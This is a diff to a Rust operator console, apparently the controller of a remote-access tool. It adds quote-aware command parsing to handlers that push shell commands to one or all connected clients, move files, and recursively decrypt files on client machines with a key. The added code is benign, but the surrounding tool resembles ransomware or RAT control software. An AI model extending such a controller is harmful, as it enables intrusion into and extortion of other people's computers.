@@ -103,6 +103,79 @@ fn get_modules_path() -> PathBuf {
     PathBuf::from("modules")
 }
 
+/// Parses a command line string respecting quotes (both single and double)
+/// Similar to shell parsing but simplified for Windows cmd.exe
+/// 
+/// Examples:
+/// - `dir "C:\Program Files"` -> ["dir", "C:\Program Files"]
+/// - `dir 'C:\Program Files'` -> ["dir", "C:\Program Files"]
+/// - `dir C:\Windows` -> ["dir", "C:\Windows"]
+fn parse_command_line(line: &str) -> Vec<String> {
+    let mut args = Vec::new();
+    let mut current_arg = String::new();
+    let mut in_double_quotes = false;
+    let mut in_single_quotes = false;
+    let mut chars = line.chars().peekable();
+    
+    while let Some(ch) = chars.next() {
+        match ch {
+            '"' if !in_single_quotes => {
+                in_double_quotes = !in_double_quotes;
+                // Don't include the quote character itself
+            }
+            '\'' if !in_double_quotes => {
+                in_single_quotes = !in_single_quotes;
+                // Don't include the quote character itself
+            }
+            ' ' | '\t' if !in_double_quotes && !in_single_quotes => {
+                // Whitespace outside quotes: end current argument
+                if !current_arg.is_empty() {
+                    args.push(current_arg.clone());
+                    current_arg.clear();
+                }
+            }
+            _ => {
+                // Regular character or whitespace inside quotes
+                current_arg.push(ch);
+            }
+        }
+    }
+    
+    // Add final argument if any
+    if !current_arg.is_empty() {
+        args.push(current_arg);
+    }
+    
+    args
+}
+
+/// Reconstructs a command line from parsed arguments, adding quotes where needed
+/// Arguments containing spaces or special characters will be quoted
+fn reconstruct_command(args: &[String]) -> String {
+    if args.is_empty() {
+        return String::new();
+    }
+    
+    let mut result = String::new();
+    
+    for (i, arg) in args.iter().enumerate() {
+        if i > 0 {
+            result.push(' ');
+        }
+        
+        // Quote if argument contains spaces or is empty
+        if arg.contains(' ') || arg.is_empty() {
+            result.push('"');
+            result.push_str(arg);
+            result.push('"');
+        } else {
+            result.push_str(arg);
+        }
+    }
+    
+    result
+}
+
 // Maneja la comunicación con un cliente
 async fn handle_client(
     id: ClientId,
@@ -657,13 +730,13 @@ async fn main() {
                 // Agregar al historial
                 let _ = rl.add_history_entry(clean_line.as_str());
                 
-                let parts: Vec<&str> = clean_line.trim().split_whitespace().collect();
+                let parts = parse_command_line(clean_line.trim());
                 
                 if parts.is_empty() {
                     continue;
                 }
 
-            match parts[0] {
+            match parts[0].as_str() {
                 "/help" => {
                     println!();
                     println!("{}", "═══════════════════════════════════════════════════════════".bright_cyan());
@@ -797,7 +870,7 @@ async fn main() {
                         continue;
                     }
                     
-                    let remote_path = parts[1..].join(" ").trim_matches('"').to_string(); // Remove quotes
+                    let remote_path = parts[1..].join(" ");
                     let selected = *selected_client.lock().unwrap();
                     
                     if let Some(id) = selected {
@@ -829,8 +902,8 @@ async fn main() {
                         continue;
                     }
                     
-                    let local_path = parts[1].trim_matches('"'); // Remove quotes
-                    let remote_path = parts[2..].join(" ").trim_matches('"').to_string(); // Remove quotes and join
+                    let local_path = &parts[1];
+                    let remote_path = parts[2..].join(" ");
                     let selected = *selected_client.lock().unwrap();
                     
                     if let Some(id) = selected {
@@ -988,13 +1061,12 @@ async fn main() {
                     }
                     
                     // Extraer path y max_depth correctamente
-                    let args: Vec<&str> = parts[1..].iter().copied().collect();
-                    let (path, max_depth) = if args.len() > 1 && args[args.len() - 1].parse::<u32>().is_ok() {
+                    let (path, max_depth) = if parts.len() > 2 && parts[parts.len() - 1].parse::<u32>().is_ok() {
                         // Último argumento es un número (max_depth)
-                        (args[..args.len() - 1].join(" ").trim_matches('\"').to_string(), args[args.len() - 1])
+                        (parts[1..parts.len() - 1].join(" "), parts[parts.len() - 1].as_str())
                     } else {
                         // Sin max_depth, usar todo como path
-                        (args.join(" ").trim_matches('\"').to_string(), "5")
+                        (parts[1..].join(" "), "5")
                     };
                     
                     let selected = *selected_client.lock().unwrap();
@@ -1092,13 +1164,12 @@ async fn main() {
                     // Formato: /decrypt <path> <key> [max_depth]
                     // El key es una string sin espacios (hash hex)
                     // max_depth es un número opcional al final
-                    let args: Vec<&str> = parts[1..].iter().copied().collect();
                     
                     // Verificar si el último argumento es max_depth (número)
-                    let (path_and_key, max_depth) = if args.len() > 2 && args[args.len() - 1].parse::<u32>().is_ok() {
-                        (&args[..args.len() - 1], args[args.len() - 1])
+                    let (path_and_key, max_depth) = if parts.len() > 3 && parts[parts.len() - 1].parse::<u32>().is_ok() {
+                        (&parts[1..parts.len() - 1], parts[parts.len() - 1].as_str())
                     } else {
-                        (&args[..], "5")
+                        (&parts[1..], "5")
                     };
                     
                     // El último elemento de path_and_key es el key (sin espacios)
@@ -1108,8 +1179,8 @@ async fn main() {
                         continue;
                     }
                     
-                    let key = path_and_key[path_and_key.len() - 1];
-                    let path = path_and_key[..path_and_key.len() - 1].join(" ").trim_matches('\"').to_string();
+                    let key = &path_and_key[path_and_key.len() - 1];
+                    let path = path_and_key[..path_and_key.len() - 1].join(" ");
                     
                     // Debug: mostrar qué se parseó
                     println!("DEBUG: path='{}', key='{}', max_depth='{}'", path, key, max_depth);
@@ -1205,7 +1276,7 @@ async fn main() {
                         continue;
                     }
                     
-                    let method = parts[1];
+                    let method = &parts[1];
                     let selected = *selected_client.lock().unwrap();
                     
                     if let Some(id) = selected {
@@ -1272,7 +1343,7 @@ async fn main() {
                         continue;
                     }
                     
-                    let config = parts[1];
+                    let config = &parts[1];
                     let selected = *selected_client.lock().unwrap();
                     
                     if let Some(id) = selected {
@@ -1341,7 +1412,7 @@ async fn main() {
                         continue;
                     }
                     
-                    let command = parts[1..].join(" ");
+                    let command = reconstruct_command(&parts[1..]);
                     let selected = *selected_client.lock().unwrap();
                     
                     if let Some(id) = selected {
@@ -1371,7 +1442,7 @@ async fn main() {
                         continue;
                     }
                     
-                    let command = parts[1..].join(" ");
+                    let command = reconstruct_command(&parts[1..]);
                     let clients = clients.lock().unwrap();
                     
                     info!("Comando /cmd_all: {} (a {} clientes)", command, clients.len());
